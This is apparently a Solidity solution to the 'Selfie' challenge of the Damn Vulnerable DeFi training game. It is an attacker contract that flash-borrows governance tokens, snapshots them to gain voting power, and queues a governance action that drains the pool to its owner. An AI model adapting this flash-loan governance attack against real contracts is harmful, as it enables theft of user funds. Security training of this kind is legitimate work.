import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract Attacker {
    SelfiePool public immutable selfiePool;
    SimpleGovernance public immutable simpleGovernance;
    address public immutable owner;

    constructor(address _selfiePool, address _simpleGovernance) {
        owner = msg.sender;
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function attack() external {
        selfiePool.flashLoan(simpleGovernance.governanceToken().balanceOf(address(selfiePool)));
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot _token = DamnValuableTokenSnapshot(token);
        _token.snapshot();
        simpleGovernance.queueAction(address(selfiePool), (abi.encodeWithSignature("drainAllFunds(address)", owner)), 0);
        _token.transfer(address(selfiePool), amount);
    }
}
